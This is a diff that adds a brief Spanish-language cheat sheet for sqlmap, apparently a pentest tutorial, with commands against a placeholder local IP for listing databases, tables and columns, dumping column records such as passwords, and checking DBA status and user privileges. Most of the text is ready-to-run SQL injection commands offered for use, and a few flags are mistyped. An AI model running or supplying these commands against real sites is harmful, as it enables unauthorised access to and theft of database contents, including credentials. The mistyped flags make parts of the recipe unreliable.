@@ -1,0 +1,26 @@
+Escaneo básico de la herramienta
+sqlmap -u http://192.168.XXX.XXX/
+-u: es la url a escanear
+Escaneo de bases de datos
+sqlmap -u http://192.168.XXX.XXX/ --dbs
+--dbs:  nos muestra la base de datos que contiene la url a escanear (Se mostrara si el sitio a escanear no cuenta con la debida seguridad).
+Entrar a base de datos y enlistar tablas
+sqlmap -u http://192.168.XXX.XXX/ --dbs -D nombreBD --tables
+-D: Entrar a base de datos y seguido pondremos el nombre de la BD que queremos acceder.
+--tables: Enlistara las tablas de la BD.
+Entrar a tabla y enlistar columnas de la BD
+sqlmap -u http://192.168.XXX.XXX/ --dbs -D nobreDB -T nombreTabla –column
+-T: Entra a la tabla que se desea de la BD.
+--column: Enlista las columnas  
+
+Obtener los registros de las columnas:
+sqlmap -u http://192.168.XXX.XXX/ -D nobreDB -T nombreTabla -C nombreColumna --dump
+-C: Enlista la columna (Si queremos enlistar 2 o más poner separadas por comas, ejemplo: id, log, password)
+--dump: Entrega los resultados
+Tutorial en video: https://www.youtube.com/watch?v=TRR5TWr-HFI
+
+Enlistar los tipos de usuarios
+Teóricamente si el usuario es DBA tiene todos los permisos para Modificar/ Borrar / Agregar, veremos si el usurarios es DBA con el siguiente comando:
+sqlmap -u http://192.168.XXX.XXX/ -current-user --is-dba
+Enlistar privilegios de usuarios
+sqlmap -u http://192.168.XXX.XXX/ --privileges
